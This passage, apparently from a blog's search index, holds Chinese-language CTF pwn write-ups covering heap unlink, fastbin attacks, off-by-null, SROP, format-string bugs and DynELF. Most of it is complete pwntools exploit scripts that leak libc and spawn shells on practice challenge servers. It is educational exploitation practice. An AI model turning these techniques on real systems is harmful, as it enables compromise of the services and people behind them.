hollk.sendline('1') hollk.sendline(str(size)) hollk.recvuntil('OK\\n')def edit(idx, size, content): hollk.sendline('2') hollk.sendline(str(idx)) hollk.sendline(str(size)) hollk.send(content) hollk.recvuntil('OK\\n')def free(idx): hollk.sendline('3') hollk.sendline(str(idx))def exp(): # trigger to malloc buffer for io function alloc(0x100) # idx 1 alloc(0x30) # idx 2 # small chunk size inorder to trigger unlink alloc(0x80) # idx 3 # a fake chunk at global[2]=head+16 who's size is 0x20 payload = p64(0) #prev_size payload += p64(0x20) #size payload += p64(head - 0x8) #fd payload += p64(head) #bk payload += p64(0x20) # next chunk's prev_size bypass the check payload = payload.ljust(0x30, 'a') # overwrite global[3]'s chunk's prev_size # make it believe that prev chunk is at global[2] payload += p64(0x30) # make it believe that prev chunk is free payload += p64(0x90) edit(2, len(payload), payload) # unlink fake chunk, so global[2] =&amp;(global[2])-0x18=head-8 free(3) hollk.recvuntil('OK\\n') #gdb.attach(hollk) # overwrite global[0] = free@got, global[1]=puts@got, global[2]=atoi@got payload = 'a' * 8 + p64(hollkelf.got['free']) + p64(hollkelf.got['puts']) + p64( hollkelf.got['atoi']) edit(2, len(payload), payload) # edit free@got to puts@plt payload = p64(hollkelf.plt['puts']) edit(0, len(payload), payload) #free global[1] to leak puts addr free(1) puts_addr = hollk.recvuntil('\\nOK\\n', drop=True).ljust(8, '\\x00') puts_addr = u64(puts_addr) log.success('puts addr: ' + hex(puts_addr)) libc_base = puts_addr - libc.symbols['puts'] binsh_addr = libc_base + next(libc.search('/bin/sh')) system_addr = libc_base + libc.symbols['system'] log.success('libc base: ' + hex(libc_base)) log.success('/bin/sh addr: ' + hex(binsh_addr)) log.success('system addr: ' + hex(system_addr)) # modify atoi@got to system addr payload = p64(system_addr) edit(2, len(payload), payload) hollk.send(p64(binsh_addr)) hollk.interactive() if __name__ == &quot;__main__&quot;: exp() # axb_2019_heap # 知识点 pwndbg 使用 regs 查看寄存器里得值 利用思路 利用格式化字符串泄露 libc 和程序基址 运用 unlink 将 chunk 0 地址覆写为 free_hook 的地址 将 system 地址写入 free_hook 触发写入的’/bin/sh’块的删除，执行 system (’/bin/sh’) # WP 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061from pwn import *#p = remote(&quot;node3.buuoj.cn&quot;,26144)p = process(&quot;./axb_2019_heap&quot;)context.log_level = 'debug'elf = ELF(&quot;./axb_2019_heap&quot;)libc = ELF('./libc-2.23-64.so')def add(idx,size,content): p.sendlineafter('&gt;&gt;','1') p.sendlineafter('):',str(idx)) p.sendlineafter('size:',str(size)) p.sendlineafter('content:',content) def delete(idx): p.sendlineafter('&gt;&gt;','2') p.sendlineafter('index:',str(idx)) def edit(idx,content): p.sendlineafter('&gt;&gt;','4') p.sendlineafter('index:',str(idx)) p.sendlineafter('content: \\n',content) def show(): p.sendlineafter('&gt;&gt;','3')p.recvuntil('name: ')p.sendline('%11$p%15$p')p.recvuntil('Hello, ')base=int(p.recv(14),16)-0x1186#success(&quot;base:&quot;+hex(base))libcbase=int(p.recv(14),16)-libc.sym['__libc_start_main']-240system=libcbase+libc.sym['system']free_hook=libcbase+libc.sym['__free_hook']bss=base+0x202060success(&quot;bss:&quot;+hex(bss))add(0,0x98,'aaaa')#0add(1,0x98,'bbbb')#1add(2,0x90,'cccc')#2add(3,0x90,'/bin/sh\\x00')#3 #gdb.attach(p) payload=p64(0)+p64(0x91)+p64(bss-0x18)+p64(bss-0x10)+p64(0)*14+p64(0x90)+'\\xa0'edit(0,payload)#gdb.attach(p)delete(1)edit(0,p64(0)*3+p64(free_hook)+p64(0x10))#gdb.attach(p)edit(0,p64(system))#gdb.attach(p)delete(3) p.interactive()","link":"/2021/11/25/unlink/"},{"title":"xdctf2015_pwn200","text":"DynELF 使用 # 程序分析 程序检查：32 位程序 主函数：vul 中存在栈溢出 # 关于 DynELF ​ 在做漏洞利用时，由于 ASLR 的影响，我们在获取某些函数地址的时候，需要一些特殊的操作。一种方法是先泄露出 libc.so 中的某个函数，然后根据函数之间的偏移，计算得到我们需要的函数地址，这种方法的局限性在于我们需要能找到和目标服务器上一样的 libc.so，而有些特殊情况下往往并不能找到。而另一种方法，利用如 pwntools 的 DynELF 模块，对内存进行搜索，直接得到我们需要的函数地址。 ​ 官方文档里给出了下面的例子： 123456789101112131415161718192021222324252627282930313233343536# Assume a process or remote connectionp = process('./pwnme')# Declare a function that takes a single address, and# leaks at least one byte at that address.def leak(address): data = p.read(address, 4) log.debug(&quot;%#x =&gt; %s&quot; % (address, (data or '').encode('hex'))) return data# For the sake of this example, let's say that we# have any of these pointers. One is a pointer into# the target binary, the other two are pointers into libcmain = 0xfeedf4celibc = 0xdeadb000system = 0xdeadbeef# With our leaker, and a pointer into our target binary,# we can resolve the address of anything.## We do not actually need to have a copy of the target# binary for this to work.d = DynELF(leak, main)assert d.lookup(None, 'libc') == libcassert d.lookup('system', 'libc') == system# However, if we *do* have a copy of the target binary,# we can speed up some of the steps.d = DynELF(leak, main, elf=ELF('./pwnme'))assert d.lookup(None, 'libc') == libcassert d.lookup('system', 'libc') == system# Alternately, we can resolve symbols inside another library,# given a pointer into it.d = DynELF(leak, libc + 0x1234)assert d.lookup('system') == system 可以看到，为了使用 DynELF，首先需要有一个 leak(address) 函数，通过这一函数可以获取到某个地址上最少 1 byte 的数据，然后将这个函数作为参数调用 d = DynELF(leak, main) ，该模块就初始化完成了，然后就可以使用它提供的函数进行内存搜索，得到我们需要的函数地址。 # 漏洞利用 第一次栈溢出 write 函数泄露 libc 地址，返回 main 函数，使用 DynELF 查找 system 地址写入 /bin/sh，再次 rop 执行拿到 shell # EXP 12345678910111213141516171819202122232425262728from pwn import *r=remote('node4.buuoj.cn',25224)# r= process('./bof')elf=ELF('./bof')read_addr=elf.symbols['read']write_addr=elf.symbols['write']main_addr=0x804851cbss_addr=elf.symbols['__bss_start'] def leak(addr): //write函数泄露libc地址 r.recvline() payload='a'*0x6c+'b'*0x4+p32(write_addr)+p32(main_addr)+p32(1)+p32(addr)+p32(0x4) r.sendline(payload) leak_addr=r.recv(4) return leak_addrd=DynELF(leak,elf=ELF('./bof'))system_addr=d.lookup('system','libc')payload='a'*0x6c+'b'*0x4+p32(read_addr)+p32(main_addr)+p32(0x0)+p32(bss_addr)+p32(0x8)r.sendline(payload)r.sendline('/bin/sh') # 通过read函数读入/bin/sh到bss段payload='a'*0x6c+'b'*0x4+p32(system_addr)+p32(main_addr)+p32(bss_addr)r.sendline(payload)r.interactive() 法二 : ret2dl-resolve 1234567891011121314151617181920212223242526272829303132333435#coding=UTF-8from pwn import *context.log_level = 'debug'sh = remote('node4.buuoj.cn',25224)elf = ELF('bof')libc = ELF('./libc-2.23x86.so')payload = 112 * 'a'payload += p32(elf.plt['write'])payload += p32(elf.symbols['main'])payload += p32(1)payload += p32(elf.got['write'])payload += p32(4)sh.sendline(payload)write_addr = u32(sh.recvuntil('\\xf7')[-4:]) #获取write函数地址print hex(write_addr)libcbase = write_addr - libc.symbols['write']system = libcbase + libc.symbols['system']binsh = libcbase + libc.search('/bin/sh').next()payload = 112 * 'a'payload += p32(system)payload += p32(0xdeadbeef)payload += p32(binsh)sh.sendline(payload)sh.interactive() # 参考文章 https://firmianay.gitbooks.io/ctf-all-in-one/content/doc/4.8_dynelf.html","link":"/2022/02/01/xdctf2015_pwn200/"},{"title":"堆题总结","text":"堆基础总结 # 堆数据结构 1234567+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ &lt;-- chunk | prev_size | size |A|M|P|+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+| user data (fd) | (bk) || || |+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ &lt;-- next chunk # Off By One # 漏洞原理 使用循环语句向堆块中写入数据时，循环次数设置错误导致多写入了一个字节 # 利用思路 溢出字节为可控制任意字节：通过修改大小造成块结构之间出现重叠，从而泄露其他块数据，或是覆盖其他块数据。也可使用 NULL 字节溢出的方法 溢出字节为 NULL 字节：在 size 为 0x100 的时候，溢出 NULL 字节可以使得 prev_in_use 位被清，这样前块会被认为是 free 块。 （1） 这时可以选择使用 unlink 方法（见 unlink 部分）进行处理。 （2） 另外，这时 prev_size 域就会启用，就可以伪造 prev_size ，从而造成块之间发生重叠。此方法的关键在于 unlink 的时候没有检查按照 prev_size 找到的块的大小与 prev_size 是否一致。 # Large bin 当 large bin 中只存在一个 chunk 时，那么该 chunk 的两个 nextsize 指针都会指向自己 # unlink unlink 过程如下图所示，主要实现堆块合并 对于 unlink (P,BK,FD) 函数本质是赋值 123456unlink(P,BK,FD){ FD = P -&gt; fd; BK = p -&gt; bk; FD -&gt; bk = BK; BK -&gt; fd = fd; } 堆块结构 FD = *(p-0x10)，0x10 是由 fd 指针在堆块的位置决定的，具体利用过程 12*(P-&gt;fd+0x18) = *(P-&gt;bk)*(P-&gt;bk+0x10) = *(P-&gt;fd) # UAF # 漏洞原理 申请任意大小的堆块并在删除时未清空指针数组（即没有设置为 NUL），导致悬空指针从而产生 UAF # 利用思路 例题： pwnable.tw - hacknote 解题思路： 通过 UAF 调用一个存在于堆块，并且被一系列对操作篡改的函数指针控制流劫持从而 getshell 具体参考文章 # EXP 123456789101112131415161718192021222324252627282930313233343536373839404142from pwn import *context.log_level = 'debug'libc = ELF('./libc_32.so.6')# io = process('./hacknote')io = remote('chall.pwnable.tw',10102)def add(size,content): io.recvuntil(&quot;choice :&quot;) io.sendline(&quot;1&quot;) io.recvuntil(&quot;size :&quot;) io.sendline(str(size)) io.recvuntil(&quot;Content :&quot;) io.sendline(content)def delete(num): io.recvuntil(&quot;choice :&quot;) io.sendline(&quot;2&quot;) io.recvuntil(&quot;Index :&quot;) io.sendline(str(num))def show(num): io.recvuntil(&quot;choice :&quot;) io.sendline(&quot;3&quot;) io.recvuntil(&quot;Index :&quot;) io.sendline(str(num))add(64,'a')add(32,'a')delete(0)add(64,'b')show(2) //unsortbin泄露libc地址libc_base = u32(io.recv(8)[4:8])-0x1b07b0system_addr = libc_base+libc.symbols['system']delete(0)delete(1)add(8,p32(system_addr)+&quot;;sh\\x00&quot;)show(0)io.interactive() # house of force # 利用前提 能够控制 top chunk 的 size 域（如堆溢出） 能够自由控制堆分配 size 大小，如申请负数的堆 向上申请 chunk 实现任意地址写 # 例题 bamboobox 修改长度可以覆盖到 top chunk 的 size 位置从而修改 top chunk size= -1, 因为 size 为无符号数，-1 被解释为 0xffffff。 利用 house of force 将 top chunk 位置放在 heap base，可以是 got 表地址也可以是分配的堆块地址。 再申请一个 0x10 堆块去修改函数指针为指定地址。 # Double Free # 漏洞原理 free 了两次堆块，在 glibc 中的检查如下： 检查 main_arean 是否指向了原来的一个 chunk, 绕过只需要 free (p1);free (p2);free (p1)，改写 fdd 指针一般执行 add 函数，然后连续 free 出 chunk2,chunk1 和构造的 fake_chunk（这个 chunk 的地址在 got 表上），对 got 表进行一个覆写，将 puts 函数 got 表改写成 magic 函数的地址。 # 利用思路 malloc 出一个 chunk1，更改 chunk1 的 fd，又由于此时 chunk1 在 fastbin list，因此可以指向一个 fakebin 实现任意地址写 # Off by null &amp;&amp; Tcache &amp;&amp; Overlap off-by-null: 利用改写将 pre_issue 位改成 \\x00 然后导致前面一个堆块莫名其妙的就 free 了（当然不是真的莫名其妙，详细请看堆块结构和记录，简单的说就是 pre_issue 是位了记录前一个堆块 free or use 情况的）。接着就是利用堆块合并，获得一个 free 的但是其实并没有 free 的堆块，这就是 overlap。整个过程其实说明了，off-by-null 可以触发 overlap，并且还是 powerful 的，可以用来泄漏地址。也可以用来修改 fd strcpy 字符串函数：复制时，遇到结束符 \\x00 才会停止复制。复制结束后，会在最后写入一个结束符 \\x00 strlen: j 不将’\\x00’结束符计入字符串长度 tcache: 这个机制和 fastbin 很像，但是为了效率会比 fastbin 少很多检查。并且堆块都会在 tacahe 走一遍再出来给我们使用，有一些特殊情况不会比如合并了的 unsortedbin。他总共有 7 个，满了才会用其他的类别的 chunk。对 double free 的检查基本没有。 例题：HITCON_2018_children_tcache 待补充 ing… # 参考文章 https://trick.ink/article/Heap_Learn/ https://blog.csdn.net/m0_56897090/article/details/120510003 https://www.freebuf.com/system/171261.html https://xz.aliyun.com/t/4324#toc-15","link":"/2022/01/27/%E5%A0%86%E9%A2%98%E6%80%BB%E7%BB%93/"},{"title":"babyheap_0ctf_2017","text":"堆溢出 # malloc_chunk 的结构 参考文章：https://blog.csdn.net/weixin_43847969/article/details/104897249 pre_size: 这个参数分两种情况，一种情况记录大小，一种情况记录数据 当前一个 chunk 的状态是空闲时记录大小（也就是被 free 的时候）， 当前一个 chunk 的状态不是空闲的时候，记录它的数据。 然后是 size： 就是这个 chunk 的大小，size 的最后 3 个比特位对大小没有影响，但是要表示了一些东西 分别是 non_main_arena : 记录当前 chunk 是否属于主线程 is_mapped：当前 chunk 是否由 mmap 分配 prev_inuse：记录前一个 chunk 是否被分配（这个最重要，因为我们当这个参数为 0 时，我们能够通过它获得上一个 chunk 的大小和地址） fd,bk: 表示用户数据，或者表示地址 chunk 非空闲时，fd 和 bk 存在的地方表示的是用户的数据， chunk 空闲时，fd 存储下一个空闲的 chunk，bk 指向上一个空闲的 chunk，这个非物理相邻表示的意思是，这个上一个和下一个表示的是被 free 的顺序，而不是地址上的相邻。 # chunk 的结构 第一个是 size of previous（前一个 chunk 的大小，如果前一个 chunk 空闲的话） 第二个 size of chunk 当前 chunk 的大小，然后再末尾有 3 个比特位 amp 分别代表上面介绍过的 3 个参数 第三个就是存储数据的部分 然后就到了下一个 chunk (next_chunk)，我们把这个 next_chunk 称为 chunk2, 上面的 chunk 称为 chunk1，可以看到如果 chunk1 正在使用的话，那么 chunk 的头部位置，也就是 prev_size，会被 chunk1 使用 然后 chunk2 的第二行的后三个比特位也分别是 A01，A 代表着是否属于主线程（这里我们不知道所以用 A 代替），0 代表着当前 chunk 不是由 mmap 分配，1 代表着前一个 chunk 已经被分配。 chunk 被 free 后结构变化： 第一行，没变化，因为它是 chunk1 第二行开始，M 的位置变成了 0，代表着 chunk 不是由 mmap 分配 第三行开始，原本存储数据的部分变成了 forward pointer to next chunk in list 也就是 fd，前面已经介绍过了，这个地方如果被使用的时候是数据，如果被 free 了，那么就存储的是下一个空闲的 chunk，下面的 back pointer to previous chunk in list（bk）同理. 然后就到了 unused space，（maybe 0 bytes long），没有使用过的空间，这时候应该被收集到各种 bin 中去。 然后就到了 chunk2, 第一行记录当前 chunk 的大小，（并且不会被前一个 chunk 占用） 第二行记录前一个 chunk 的大小，并且末尾三位变成了 A00,（这时候如果这个是堆中第一个被分配的 chunk 的话我们能通过 prev_size 字段获取上一个 chunk 的大小以及地址。） chunk 的空间复用： # bin 及分类 # fast bins # small bins # large bins # unsorted bins 未被分类，刚被 free 未真的进入 bin Top Chunk # babyheap_0ctf_2017 考点： fastbin attack # 利用思路 两次 double free 与 fastbin attack 。 第一次先泄露 libc 地址，然后找到构造 fake chunk 的地址。 第二次通过构造的 fake chunk 堆溢出覆写 __malloc_hook 完成 get shell 。 # 利用过程 1、通过 unsortedbin attack 来泄露 libc 地址 首先应该记住这样一条规律：当 small chunk 被释放时，它的 fd、bk 指向一个指针，这个指针指向 top chunk 地址，这个指针保存在 main_arena 的 0x58 偏移处，而 main_arena 是 libc 的 data 段中，是全局静态变量，所以偏移也是固定的，根据这些就可以计算出 libc 的基地址了，所以重点是当 small chunk 释放时，能读出 fd 或者 bk 的值 我首先通过如下重叠两个块来泄漏 libc 的地址（也是常见的攻击）。 payload: 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465from pwn import *e = ELF('./libc-2.23.so')p = remote('node4.buuoj.cn',29370)# p = process('./babyheap')p.readuntil('Command:')context(log_level='debug')def alloc(a): p.writeline('1') p.readuntil('Size:') p.writeline(str(a)) #p.readuntil('Command:')def update(a,b,c): p.writeline('2') p.readuntil('Index:') p.writeline(str(a)) p.readuntil('Size:') p.writeline(str(b)) p.readuntil('Content:') p.write(c) p.readuntil('Command:')def dele(a): p.writeline('3') p.readuntil('Index:') p.writeline(str(a)) p.readuntil('Command:')def show(a): p.writeline('4') p.readuntil('Index:') p.writeline(str(a))alloc(0x18) #0alloc(0x18) #1alloc(0x68) #2alloc(0x68) #3update(0, 0x20, 'a'*0x18+p64(0x91)) #size1+size2dele(1) #1 #free1alloc(0x18) #alloc1show(2) #fd, bk at alloc2#gdb.attach(p)libcbase = u64(p.recvuntil('\\x7f')[-6:].ljust(8, '\\x00')) - 0x3c4b78log.info(hex(libcbase))malloc_hook = libcbase + 0x3c4aedlog.info(hex(malloc_hook))one = libcbase + 0x4526adele(2) #free2#gdb.attach(p)update(1, 0x28, 'a'*0x18+p64(0x71)+p64(malloc_hook)) #fd at 2-&gt;malloc_hook#gdb.attach(p)alloc(0x68) #2#gdb.attach(p)alloc(0x68) #4 at malloc_hook#gdb.attach(p)update(4, 0x1b, p8(2)*3+p64(2)*2+p64(one))#gdb.attach(p)alloc(255) p.interactive()","link":"/2021/11/15/%E5%A0%86%E6%BA%A2%E5%87%BA/"},{"title":"BUUCTF Pwn Exercise(一)","text":"BUUOJ PWN EXERCISE # rootersctf_2019_srop(srop) # EXP 1234567891011121314151617181920212223242526272829303132from pwn import *sh = process(&quot;rootersctf_2019_srop&quot;)context.update(arch=&quot;amd64&quot;, os=&quot;linux&quot;, endian=&quot;little&quot;)# write /bin/sh on 0x402000data_addr = 0x402000syscall_leave_ret = 0x401033pop_rax_syscall_leave_ret = 0x401032syscall_addr = 0x401046frame = SigreturnFrame(kernel=&quot;amd64&quot;)frame.rax = 0 # read frame.rdi = 0 # stdinframe.rsi = data_addrframe.rdx = 0x400frame.rip = syscall_leave_retframe.rbp = data_addr + 0x20layout = [0x88 * &quot;a&quot;, pop_rax_syscall_leave_ret, 0xf, bytes(frame)]# srop to call read, set *data_addr = /bin/sh\\x00sh.sendlineafter(&quot;Hey, can i get some feedback for the CTF?\\n&quot;, flat(layout))# call execve /bin/shlayout = [&quot;/bin/sh\\x00&quot;, &quot;a&quot; * 0x20, pop_rax_syscall_leave_ret, 0xf]frame = SigreturnFrame(kernel=&quot;amd64&quot;)frame.rax = 59 # execve frame.rdi = data_addr # stdinframe.rsi = 0frame.rdx = 0frame.rip = syscall_addrlayout.append(bytes(frame))sh.sendline(flat(layout))sh.interactive() # 参考文章 https://blog.csdn.net/weixin_46521144/article/details/120714498 https://www.cnblogs.com/LynneHuan/p/14723605.html#exp # qctf_2018_stack2（数组越界） # EXP 123456789101112131415161718192021222324252627#!/usr/bin/env python # coding=utf-8 from pwn import * context(log_level = 'debug') sh = remote(&quot;node3.buuoj.cn&quot;,&quot;28924&quot;) sh.sendlineafter('have:\\n','0') sh.sendlineafter('5. exit\\n','3') sh.sendlineafter('change:\\n',str(116 + 0x10)) sh.sendlineafter('number:\\n',str(0x9b)) sh.sendlineafter('5. exit\\n','3') sh.sendlineafter('change:\\n',str(117 + 0x10)) sh.sendlineafter('number:\\n',str(0x85)) sh.sendlineafter('5. exit\\n','3') sh.sendlineafter('change:\\n',str(118 + 0x10)) sh.sendlineafter('number:\\n',str(0x04)) sh.sendlineafter('5. exit\\n','3') sh.sendlineafter('change:\\n',str(119 + 0x10)) sh.sendlineafter('number:\\n',str(0x08)) sh.sendlineafter('5. exit\\n','5') sh.interactive() # hfctf_2020_marksman(exit_hook) # EXP 123456789101112131415161718192021222324252627282930313233from pwn import *import functoolsLOG_ADDR = lambda x, y: log.success('{} ===&gt; {}'.format(x, hex(y)))int16 = functools.partial(int, base=16)# sh = process(&quot;./hfctf_2020_marksman&quot;)sh = remote('node4.buuoj.cn',27982)sh.recvuntil(&quot;I placed the target near: &quot;)msg = sh.recvline()puts_addr = int16(msg[:-1].decode())LOG_ADDR(&quot;puts_addr&quot;, puts_addr)libc_base_addr = puts_addr - 0x809c0LOG_ADDR(&quot;libc_base_addr&quot;, libc_base_addr)one_gadget1 = libc_base_addr + 0x10a387__rtld_lock_unlock_recursive_offset = 0x81df60target_addr = libc_base_addr + __rtld_lock_unlock_recursive_offset# one_gadget1 = libc_base_addr + 0xe569f# _dl_catch_error_offset = 0x5f4038# target_addr = libc_base_addr + _dl_catch_error_offsetsh.sendlineafter(&quot;shoot!shoot!\\n&quot;, str(target_addr))input_gadget = one_gadget1for _ in range(3): sh.sendlineafter(&quot;biang!\\n&quot;, chr(input_gadget &amp; 0xff)) input_gadget = input_gadget &gt;&gt; 8sh.interactive() # 参考文章 Python 中的 functools # picoctf_2018_echooo (32 位格式化字符串) # EXP 12345678910111213from pwn import *#p=process('./PicoCTF_2018_echooo')p=remote('node4.buuoj.cn',28387)offset=11flag=''for i in range(27,27+11): payload='%{}$p'.format(str(i)) p.sendlineafter('&gt; ',payload) aim=unhex(p.recvuntil('\\n',drop=True).replace('0x','')) flag+=aim[::-1]print flagp.interactive() # npuctf_2020_level2 (args 上的格式化字符串漏洞) # 程序分析 # 漏洞利用 漏洞点为 printf 格式化字符串部分，但 buf 在 bss 段不在栈上因而不能通过填地址来写入，需要借助地址链分批次写入 # EXP 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879from pwn import *import functoolsLOG_ADDR = lambda x, y: log.success('{} ===&gt; {}'.format(x, hex(y)))int16 = functools.partial(int, base=16)context.update(arch='amd64', os='linux', endian='little')# sh = process('./npuctf_2020_level2')sh = remote('node4.buuoj.cn',27290)sh.sendline(&quot;%9$p,%24$p&quot;)msg = sh.recvline()stack_addr, libc_addr = msg[:-1].split(b',')stack_addr = int16(stack_addr.decode())libc_addr = int16(libc_addr.decode())LOG_ADDR('stack_addr', stack_addr)LOG_ADDR('libc_addr', libc_addr)stack_ret_addr = stack_addr - 0xe0libc_base_addr = libc_addr - 0x3e7638LOG_ADDR('stack_ret_addr', stack_ret_addr)LOG_ADDR('libc_base_addr', libc_base_addr)gadgets = [0x4f2c5, 0x4f322, 0x10a38c]one_gadget = libc_base_addr + gadgets[0]LOG_ADDR('one_gadget', one_gadget)sleep(1)payload = &quot;%{}c%9$hn&quot;.format((stack_ret_addr &amp; 0xffff))sh.sendline(payload)sh.recv()for _ in range(2): sh.sendline('a' * 0x30) sh.recv() sleep(2)payload = &quot;%{}c%35$hn&quot;.format((one_gadget &amp; 0xffff)) + 'a' * 0x10sh.sendline(payload)sh.recv()sleep(2)for _ in range(2): sh.sendline('a' * 0x30) sh.recv() sleep(2)payload = &quot;%{}c%9$hhn&quot;.format((stack_ret_addr &amp; 0xff) + 2)sh.sendline(payload)sh.recv()sleep(2)for _ in range(2): sh.sendline('a' * 0x30) sh.recv() sleep(2)payload = &quot;%{}c%35$hhn&quot;.format(((one_gadget &gt;&gt; 16) &amp; 0xff)) + 'a' * 0x10sh.sendline(payload)sh.recv()sleep(2)for _ in range(2): sh.sendline('a' * 0x30) sh.recv() sleep(2)sh.send(&quot;6&quot; * 8 + '\\x00' * 8)sleep(3)sh.sendline(&quot;cat flag&quot;)sh.interactive() 123456789101112131415161718192021222324252627282930from pwn import *#9 35#p=process('./npuctf_2020_level2')p=remote('node4.buuoj.cn',27290)libc=ELF('./libc-2.27.so')context.log_level='debug'payload1='%7$p#%9$p@'p.sendline(payload1)p.recvuntil('0x')libc_base=(int(p.recvuntil(&quot;#&quot;,True),16) - 231)-libc.symbols['__libc_start_main']p.recvuntil('0x')addr_stack=int(p.recvuntil(&quot;@&quot;,True),16)-0xe0one_gadgets = [0x4f2c5,0x4f322,0x10a38c]one_gadget=one_gadgets[1]+libc_basestackbase = addr_stack &amp; 0xffffp.sendlineafter('\\n', '%' + str(stackbase) + 'c%9$hn\\x00')p.sendlineafter('\\x20\\x20\\xb4', '%'+str(one_gadget&amp;0xff)+'c%35$hhn\\x00')p.sendlineafter('\\x20\\x20\\xb4', '%'+str(stackbase+1)+'c%9$hhn\\x00')p.sendlineafter('\\x20\\x20\\xb4', '%'+str((one_gadget&gt;&gt;8)&amp;0xffff)+'c%35$hhn\\x00')p.sendlineafter('\\x20\\x20\\xb4', '%'+str(stackbase+2)+'c%9$hhn\\x00')p.sendlineafter('\\x20\\x20\\xb4', '%'+str((one_gadget&gt;&gt;16)&amp;0xff)+'c%35$hhn\\x00')#p.recv('\\x20\\x20\\xb4')p.sendline('66666666\\x00')#p.recv()print(hex(libc.symbols['__libc_start_main']))#gdb.attach(p)p.interactive() # asis2016_b00ks(off-by-null) # EXP 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485from pwn import *r = remote(&quot;node4.buuoj.cn&quot;, 28085)#r = process(&quot;./asis2016_b00ks&quot;)context(log_level = 'debug', arch = 'amd64', os = 'linux')DEBUG = 0if DEBUG: gdb.attach(r, ''' b *$rebase(0x1245) x/20gx $rebase(0x202040) c ''')elf = ELF(&quot;./b00ks&quot;)libc = ELF('./libc-2.23.so')one_gadget_16 = [0x45216,0x4526a,0xf02a4,0xf1147]menu = &quot;&gt; &quot;def add(size1, content1, size2, content2): r.recvuntil(menu) r.sendline('1') r.recvuntil(&quot;Enter book name size: &quot;) r.sendline(str(size1)) r.recvuntil(&quot;Enter book name (Max 32 chars): &quot;) r.send(content1) r.recvuntil(&quot;Enter book description size: &quot;) r.sendline(str(size2)) r.recvuntil(&quot;Enter book description: &quot;) r.send(content2)def delete(index): r.recvuntil(menu) r.sendline('2') r.recvuntil(&quot;Enter the book id you want to delete: &quot;) r.sendline(str(index))def edit(index, content): r.recvuntil(menu) r.sendline('3') r.recvuntil(&quot;Enter the book id you want to edit: &quot;) r.sendline(str(index)) r.recvuntil(&quot;Enter new book description: &quot;) r.send(content)def show(): r.recvuntil(menu) r.sendline('4')def edit_name(name): r.recvuntil(menu) r.sendline('5') r.recvuntil(&quot;Enter author name: &quot;) r.send(name)r.recvuntil(&quot;Enter author name: &quot;)r.send('a'*0x20+'\\n')add(0x90, 'aa\\n', 0x90, 'aa\\n')add(0x21000, 'aa\\n', 0x21000, 'aa\\n')show()r.recvuntil('a'*0x20)heap = u64(r.recvuntil('\\n').strip().ljust(8, '\\x00')) - 0x160success(&quot;heap:&quot;+hex(heap))payload = 'a' * 0x40 + p64(1) + p64(heap+0x198)*2 + p64(0xffff) + '\\n'edit(1, payload)edit_name('a'*0x20 + '\\n')show()r.recvuntil(&quot;Name: &quot;)#offset = 0x7fc715ef1010 - 0x7fc71593e000offset = 0x7f4875e6a010 - 0x7f48758a4000libc.address = u64(r.recvuntil('\\x7f').ljust(8, '\\x00')) - offsetsuccess(&quot;libc:&quot;+hex(libc.address))free_hook = libc.sym['__free_hook']system = libc.sym['system']bin_sh = libc.search(&quot;/bin/sh&quot;).next()edit(1, p64(bin_sh) + p64(free_hook) + '\\n')edit(2, p64(system)+'\\n')delete(2)r.interactive() # babyfengshui_33c3_2016 # 程序分析 checksec 后可以看到 relro 保护没开，可以劫持函数 got 表 由于是 *（&amp;ptr+a1）-4 是靠偏移来确定大小的，所以也就只有在 name 堆块与 text 堆块在物理地址相邻时才有作用，因此我们可以通过 delete 函数删除一个 user 便可以使程序连续 free 掉两个堆块，从而使两个 0x88 的堆块合并成为一个 0x110 的堆块 进而我们再次使用 add 添加数据的时候，第一次输入的 name 设置大小为 0x100 就可以使 name 与 text 堆块物理不相邻，这样一来我们的 text 字段便可输入任意大小的数据 接下来就可以对能够造成溢出的 name 堆块填充大量的数据覆盖到下一个 user 的 name 字段中，来控制下一个 user 中的 text 地址指向 最后便可以控制该 text 指向某个函数的 got 表地址，即可劫持函数的 got 表指向 system 函数。 # EXP 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758from pwn import *from LibcSearcher import LibcSearchercontext.log_level='debug'# p=remote(&quot;node4.buuoj.cn&quot;,26147)p=process('./babyfengshui')elf=ELF('./babyfengshui')free_got=elf.got['free']def add(size,name,length,text): p.recvuntil(&quot;Action: &quot;) p.sendline(&quot;0&quot;) p.sendlineafter(&quot;size of description: &quot;,str(size)) p.sendlineafter(&quot;name: &quot;,name) p.recvuntil(&quot;text length:&quot;) p.sendline(str(length)) p.recvuntil(&quot;text:&quot;) p.sendline(text)def delete(index): p.recvuntil(&quot;Action: &quot;) p.sendline(&quot;1&quot;) p.recvuntil(&quot;index: &quot;) p.sendline(str(index))def show(index): p.recvuntil(&quot;Action: &quot;) p.sendline(&quot;2&quot;) p.recvuntil(&quot;index: &quot;) p.sendline(str(index))def update(index,length,text): p.recvuntil(&quot;Action: &quot;) p.sendline(&quot;3&quot;) p.recvuntil(&quot;index: &quot;) p.sendline(str(index)) p.recvuntil(&quot;text length: &quot;) p.sendline(str(length)) p.recvuntil(&quot;text: &quot;) p.sendline(text)add(0x80,&quot;nam1&quot;,0x80,&quot;aaaa&quot;)add(0x80,&quot;nam2&quot;,0x80,&quot;bbbb&quot;)add(0x80,&quot;nam3&quot;,0x80,&quot;/bin/sh\\x00&quot;) #写入/bin/shdelete(0)add(0x100,'nam1',0x100,&quot;cccc&quot;)payload='a'*0x108+'a'*0x8+'a'*0x80+'a'*0x8+p32(free_got)update(3,0x200,payload)show(1)p.recvuntil(&quot;description: &quot;)free_addr=u32(p.recv(4))libc=LibcSearcher(&quot;free&quot;,free_addr)libc_base=free_addr-libc.dump(&quot;free&quot;)system_addr=libc_base+libc.dump(&quot;system&quot;)update(1,0x80,p32(system_addr))delete(2)p.interactive() # gyctf_2020_borrowstack (栈迁移) 1234567891011121314151617181920212223242526272829303132333435363738from pwn import *from LibcSearcher import 